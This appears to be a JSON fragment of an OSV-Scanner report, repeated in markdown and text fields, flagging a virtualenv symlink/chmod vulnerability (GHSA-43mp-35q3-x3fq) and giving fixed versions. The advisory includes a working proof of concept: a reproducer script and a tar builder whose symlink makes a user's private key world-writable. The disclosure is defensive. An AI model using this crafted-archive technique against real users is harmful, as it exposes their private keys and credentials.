                "markdown": "**Your dependency is vulnerable to [CVE-2026-113724](https://osv.dev/CVE-2026-113724)**.\n\n## [GHSA-43mp-35q3-x3fq](https://osv.dev/GHSA-43mp-35q3-x3fq)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows\n\u003e symlinks. On an eligible unlink failure this can change permissions outside the destination.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Permission recovery after a filesystem deletion error.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have\n\u003e permission to change the target mode. This is conditional error handling, not the normal successful unlink path.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e `safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler\n\u003e calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's\n\u003e mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become\n\u003e `0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;\n\u003e root does not reach this failure path.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to\n\u003e the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and\n\u003e `virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the\n\u003e key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the\n\u003e key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.\n\u003e \n\u003e This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the\n\u003e widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to\n\u003e #3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on\n\u003e deletion failure and handles Windows read-only entries without following reparse points.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as Prepared read-only venv tree\n\u003e     participant V as safe_delete error handler\n\u003e     participant L as Symlink in venv\n\u003e     participant K as User's 0400 key\n\u003e     A-\u003e\u003eV: virtualenv venv or --clear venv\n\u003e     V-\u003e\u003eL: unlink fails in 0555 directory\n\u003e     V-\u003e\u003eL: lstat returns link mode 0777\n\u003e     V-\u003e\u003eL: chmod follows symlink\n\u003e     L-\u003e\u003eK: target mode becomes 0777\n\u003e     V--\u003e\u003eA: retry fails with PermissionError\n\u003e     Note over K: Other accounts can use new mode if parent paths are traversable\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import stat\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e from pathlib import Path\n\u003e \n\u003e NOBODY = 65534\n\u003e \n\u003e work = Path(tempfile.mkdtemp(prefix=\"repro-safe-delete-\"))\n\u003e os.chmod(work, 0o755)\n\u003e os.chown(work, NOBODY, NOBODY)\n\u003e \n\u003e # the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable\n\u003e make_archive = [sys.executable, \"/tmp/repro.d/make_project_archive.py\"]\n\u003e subprocess.run([*make_archive, work / \"read-only.tar\", \"555\"], check=True)\n\u003e subprocess.run([*make_archive, work / \"writable.tar\", \"755\"], check=True)\n\u003e subprocess.run([\"tar\", \"-tvf\", work / \"read-only.tar\"], check=True)\n\u003e \n\u003e # from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run\n\u003e os.setgroups([])\n\u003e os.setgid(NOBODY)\n\u003e os.setuid(NOBODY)\n\u003e os.umask(0o022)\n\u003e \n\u003e \n\u003e def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):\n\u003e     home = work / home_name\n\u003e     archive = work / archive_name\n\u003e     key = home / \"keys\" / \"deploy.pem\"\n\u003e     key.parent.mkdir(parents=True)\n\u003e     key.write_text(\"PRIVATE KEY\\n\")\n\u003e     key.chmod(0o400)\n\u003e     subprocess.run([\"tar\", \"-xf\", archive], cwd=home, check=True)\n\u003e \n\u003e     mode_before = stat.S_IMODE(key.stat().st_mode)\n\u003e     command = [\"virtualenv\", \"--no-periodic-update\", \"-q\", *options, \"venv\"]\n\u003e     # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it\n\u003e     result = subprocess.run(\n\u003e         command,\n\u003e         cwd=home / \"proj\",\n\u003e         env={**os.environ, \"HOME\": str(home)},\n\u003e         stdout=subprocess.PIPE,\n\u003e         stderr=subprocess.STDOUT,\n\u003e         text=True,\n\u003e     )\n\u003e     mode_after = stat.S_IMODE(key.stat().st_mode)\n\u003e \n\u003e     print(f\"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}\")\n\u003e     print(f\"{label} {key} mode {mode_before:#o} -\u003e {mode_after:#o}\")\n\u003e     return mode_before, mode_after\n\u003e \n\u003e \n\u003e control = unpack_next_to_key_and_run_virtualenv(\"CONTROL \", \"home-control\", \"writable.tar\")\n\u003e default = unpack_next_to_key_and_run_virtualenv(\"OBSERVED\", \"home-default\", \"read-only.tar\")\n\u003e clear = unpack_next_to_key_and_run_virtualenv(\"OBSERVED\", \"home-clear\", \"read-only.tar\", \"--clear\")\n\u003e \n\u003e # check: the key lives outside the destination; virtualenv has no business changing its mode\n\u003e print(\"BUG\" if control == (0o400, 0o400) and default == (0o400, 0o777) and clear == (0o400, 0o777) else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/make_project_archive.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import sys\n\u003e import tarfile\n\u003e \n\u003e archive_path = sys.argv[1]\n\u003e python_folder_mode = int(sys.argv[2], 8)\n\u003e \n\u003e with tarfile.open(archive_path, \"w\") as archive:\n\u003e     python_folder = tarfile.TarInfo(\"proj/venv/bin/python\")\n\u003e     python_folder.type = tarfile.DIRTYPE\n\u003e     python_folder.mode = python_folder_mode  # without the write bit, unlinking an entry inside it fails with EACCES\n\u003e     archive.addfile(python_folder)\n\u003e \n\u003e     link = tarfile.TarInfo(\"proj/venv/bin/python/entry\")\n\u003e     link.type = tarfile.SYMTYPE\n\u003e     link.linkname = \"../../../../keys/deploy.pem\"  # the victim's key, beside the unpacked proj/\n\u003e     archive.addfile(link)\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion\n\u003e failure to occur on a link and the invoking user to have permission to change the target mode.\n\u003e \n\u003e Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that\n\u003e opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It\n\u003e rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains\n\u003e outside this protection.\n\u003e \n\u003e Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before\n\u003e retrying with broader privileges.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-43mp-35q3-x3fq | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113724\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113724\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-113724](https://osv.dev/CVE-2026-113724)**.\n\n## [GHSA-43mp-35q3-x3fq](https://osv.dev/GHSA-43mp-35q3-x3fq)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows\n\u003e symlinks. On an eligible unlink failure this can change permissions outside the destination.\n\u003e \n\u003e Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.\n\u003e \n\u003e ## Affected area\n\u003e \n\u003e Permission recovery after a filesystem deletion error.\n\u003e \n\u003e ## Attacker-controlled input\n\u003e \n\u003e A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have\n\u003e permission to change the target mode. This is conditional error handling, not the normal successful unlink path.\n\u003e \n\u003e ## Affected code\n\u003e \n\u003e The relevant 21.14.8 source is in\n\u003e [safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).\n\u003e \n\u003e ## Mechanism\n\u003e \n\u003e `safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler\n\u003e calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's\n\u003e mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become\n\u003e `0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;\n\u003e root does not reach this failure path.\n\u003e \n\u003e ## Reproduction and evidence\n\u003e \n\u003e The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to\n\u003e the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and\n\u003e `virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the\n\u003e key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the\n\u003e key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.\n\u003e \n\u003e This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the\n\u003e widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to\n\u003e #3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on\n\u003e deletion failure and handles Windows read-only entries without following reparse points.\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as Prepared read-only venv tree\n\u003e     participant V as safe_delete error handler\n\u003e     participant L as Symlink in venv\n\u003e     participant K as User's 0400 key\n\u003e     A-\u003e\u003eV: virtualenv venv or --clear venv\n\u003e     V-\u003e\u003eL: unlink fails in 0555 directory\n\u003e     V-\u003e\u003eL: lstat returns link mode 0777\n\u003e     V-\u003e\u003eL: chmod follows symlink\n\u003e     L-\u003e\u003eK: target mode becomes 0777\n\u003e     V--\u003e\u003eA: retry fails with PermissionError\n\u003e     Note over K: Other accounts can use new mode if parent paths are traversable\n\u003e ```\n\u003e \n\u003e ## Reproducer files\n\u003e \n\u003e The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`\n\u003e in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs\n\u003e need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files\n\u003e are included as evidence and were not rerun for this advisory update.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import stat\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e from pathlib import Path\n\u003e \n\u003e NOBODY = 65534\n\u003e \n\u003e work = Path(tempfile.mkdtemp(prefix=\"repro-safe-delete-\"))\n\u003e os.chmod(work, 0o755)\n\u003e os.chown(work, NOBODY, NOBODY)\n\u003e \n\u003e # the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable\n\u003e make_archive = [sys.executable, \"/tmp/repro.d/make_project_archive.py\"]\n\u003e subprocess.run([*make_archive, work / \"read-only.tar\", \"555\"], check=True)\n\u003e subprocess.run([*make_archive, work / \"writable.tar\", \"755\"], check=True)\n\u003e subprocess.run([\"tar\", \"-tvf\", work / \"read-only.tar\"], check=True)\n\u003e \n\u003e # from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run\n\u003e os.setgroups([])\n\u003e os.setgid(NOBODY)\n\u003e os.setuid(NOBODY)\n\u003e os.umask(0o022)\n\u003e \n\u003e \n\u003e def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):\n\u003e     home = work / home_name\n\u003e     archive = work / archive_name\n\u003e     key = home / \"keys\" / \"deploy.pem\"\n\u003e     key.parent.mkdir(parents=True)\n\u003e     key.write_text(\"PRIVATE KEY\\n\")\n\u003e     key.chmod(0o400)\n\u003e     subprocess.run([\"tar\", \"-xf\", archive], cwd=home, check=True)\n\u003e \n\u003e     mode_before = stat.S_IMODE(key.stat().st_mode)\n\u003e     command = [\"virtualenv\", \"--no-periodic-update\", \"-q\", *options, \"venv\"]\n\u003e     # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it\n\u003e     result = subprocess.run(\n\u003e         command,\n\u003e         cwd=home / \"proj\",\n\u003e         env={**os.environ, \"HOME\": str(home)},\n\u003e         stdout=subprocess.PIPE,\n\u003e         stderr=subprocess.STDOUT,\n\u003e         text=True,\n\u003e     )\n\u003e     mode_after = stat.S_IMODE(key.stat().st_mode)\n\u003e \n\u003e     print(f\"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}\")\n\u003e     print(f\"{label} {key} mode {mode_before:#o} -\u003e {mode_after:#o}\")\n\u003e     return mode_before, mode_after\n\u003e \n\u003e \n\u003e control = unpack_next_to_key_and_run_virtualenv(\"CONTROL \", \"home-control\", \"writable.tar\")\n\u003e default = unpack_next_to_key_and_run_virtualenv(\"OBSERVED\", \"home-default\", \"read-only.tar\")\n\u003e clear = unpack_next_to_key_and_run_virtualenv(\"OBSERVED\", \"home-clear\", \"read-only.tar\", \"--clear\")\n\u003e \n\u003e # check: the key lives outside the destination; virtualenv has no business changing its mode\n\u003e print(\"BUG\" if control == (0o400, 0o400) and default == (0o400, 0o777) and clear == (0o400, 0o777) else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/make_project_archive.py`**\n\u003e \n\u003e ```text\n\u003e #!/usr/bin/env python3\n\u003e import sys\n\u003e import tarfile\n\u003e \n\u003e archive_path = sys.argv[1]\n\u003e python_folder_mode = int(sys.argv[2], 8)\n\u003e \n\u003e with tarfile.open(archive_path, \"w\") as archive:\n\u003e     python_folder = tarfile.TarInfo(\"proj/venv/bin/python\")\n\u003e     python_folder.type = tarfile.DIRTYPE\n\u003e     python_folder.mode = python_folder_mode  # without the write bit, unlinking an entry inside it fails with EACCES\n\u003e     archive.addfile(python_folder)\n\u003e \n\u003e     link = tarfile.TarInfo(\"proj/venv/bin/python/entry\")\n\u003e     link.type = tarfile.SYMTYPE\n\u003e     link.linkname = \"../../../../keys/deploy.pem\"  # the victim's key, beside the unpacked proj/\n\u003e     archive.addfile(link)\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion\n\u003e failure to occur on a link and the invoking user to have permission to change the target mode.\n\u003e \n\u003e Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that\n\u003e opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It\n\u003e rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains\n\u003e outside this protection.\n\u003e \n\u003e Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before\n\u003e retrying with broader privileges.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-43mp-35q3-x3fq | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113724\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113724\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
